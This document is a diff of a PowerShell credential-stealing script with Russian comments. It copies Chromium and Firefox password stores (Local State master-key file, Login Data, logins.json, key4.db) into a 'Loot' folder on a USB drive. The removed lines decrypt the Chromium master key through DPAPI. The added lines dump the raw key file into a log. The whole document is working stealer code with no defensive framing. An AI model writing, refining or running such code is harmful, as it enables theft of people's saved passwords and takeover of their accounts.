@@ -6,10 +6,7 @@ if (!$usb) { exit }
 $time = Get-Date -Format "HH_mm_ss"
 $dest = "$($usb):\Loot\$time"
 New-Item -ItemType Directory -Path $dest -Force | Out-Null
-$logFile = "$dest\keys_report.log"
-
-# Подгружаем сборку для работы с DPAPI
-Add-Type -AssemblyName System.Security
+$logFile = "$dest\ALL_KEYS_TEXT.log"
 
 # 3. Сбор Chromium (Chrome, Edge, Yandex)
 $browsers = @(
@@ -23,40 +20,33 @@ foreach ($b in $browsers) {
     if (Test-Path $uPath) {
         $prefix = $b.n
         
-        # Обработка Мастер-ключа
+        # Копируем файл Local State и записываем его содержимое в лог
         $lsPath = Join-Path $uPath "Local State"
         if (Test-Path $lsPath) {
-            try {
-                # Копируем физический файл
-                Copy-Item $lsPath -Destination "$dest\$($prefix)_MASTER_KEY" -Force
-                
-                # Извлекаем ключ в .log для удобства
-                $json = Get-Content $lsPath -Raw | ConvertFrom-Json
-                $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($json.os_crypt.encrypted_key).Length-1)]
-                $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                $base64Key = [Convert]::ToBase64String($masterKey)
-                
-                "[$prefix] Master Key: $base64Key" | Out-File -FilePath $logFile -Append -Encoding UTF8
-            } catch {
-                "[$prefix] Error extracting key: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append -Encoding UTF8
-            }
+            Copy-Item $lsPath -Destination "$dest\$($prefix)_LocalState" -Force
+            
+            # Добавляем содержимое файла в общий лог для удобства
+            "--- START OF $($prefix) KEY ---" | Out-File -FilePath $logFile -Append
+            Get-Content $lsPath -Raw | Out-File -FilePath $logFile -Append
+            "--- END OF $($prefix) KEY ---`n" | Out-File -FilePath $logFile -Append
         }
         
         # Копируем базы паролей
         Get-ChildItem -Path $uPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
             $profile = $_.Directory.Name
-            Copy-Item $_.FullName -Destination "$dest\$($prefix)_$($profile)_LOGINS.db" -Force -ErrorAction SilentlyContinue
+            Copy-Item $_.FullName -Destination "$dest\$($prefix)_$($profile)_LoginData" -Force -ErrorAction SilentlyContinue
         }
     }
 }
 
-# 4. Сбор Firefox (без изменений)
+# 4. Сбор Firefox
 $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
 if (Test-Path $ffPath) {
     Get-ChildItem -Path $ffPath -Directory | ForEach-Object {
         $p = $_.FullName
-        Copy-Item (Join-Path $p "logins.json") -Destination "$dest\FF_$($_.Name)_logins.json" -ErrorAction SilentlyContinue
-        Copy-Item (Join-Path $p "key4.db") -Destination "$dest\FF_$($_.Name)_key4.db" -ErrorAction SilentlyContinue
+        $n = $_.Name
+        Copy-Item (Join-Path $p "logins.json") -Destination "$dest\FF_$($n)_logins.json" -ErrorAction SilentlyContinue
+        Copy-Item (Join-Path $p "key4.db") -Destination "$dest\FF_$($n)_key4.db" -ErrorAction SilentlyContinue
     }
 }
 
